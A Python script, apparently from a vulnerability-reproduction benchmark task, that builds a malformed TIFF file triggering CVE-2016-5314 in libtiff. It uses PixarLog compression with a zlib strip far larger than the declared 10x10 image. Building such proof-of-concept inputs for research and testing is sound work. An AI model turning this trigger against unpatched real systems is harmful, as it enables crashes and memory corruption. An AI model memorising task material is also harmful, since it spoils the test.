import struct
import zlib
import os

def build_poc():
    # Little-endian TIFF header, Magic 42, IFD offset at byte 8
    header = b"II\x2a\x00\x08\x00\x00\x00"
    
    # We create a zlib payload that inflates to 100,000 bytes!
    raw_uncompressed_attack = b"A" * 100000 
    zlib_payload = zlib.compress(raw_uncompressed_attack)

    # IFD Entries
    # Format: tag(2), type(2), count(4), value or offset(4)
    entries = [
        (256, 3, 1, 10),            # ImageWidth: 10
        (257, 3, 1, 10),            # ImageLength: 10
        (258, 3, 1, 8),             # BitsPerSample: 8
        (259, 3, 1, 32909),         # Compression: PIXARLOG
        (262, 3, 1, 1),             # PhotometricInterpretation: BlackIsZero
        (273, 4, 1, 122),           # StripOffsets: byte offset where zlib stream begins
        (277, 3, 1, 1),             # SamplesPerPixel: 1
        (278, 3, 1, 10),            # RowsPerStrip: 10
        (279, 4, 1, len(zlib_payload)) # StripByteCounts: Exact size of zlib stream
    ] # Total entries: 9. IFD size = 2 + (9 * 12) + 4 = 114 bytes
    
    ifd = struct.pack("<H", len(entries))
    for tag, dtype, count, val in entries:
        ifd += struct.pack("<HHII", tag, dtype, count, val)
    ifd += struct.pack("<I", 0) # Pointer to next IFD (0 = end)
    
    return header + ifd + zlib_payload

output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))

with open(output_path, "wb") as f:
    f.write(build_poc())
    
print(f"PoC written to {output_path}")
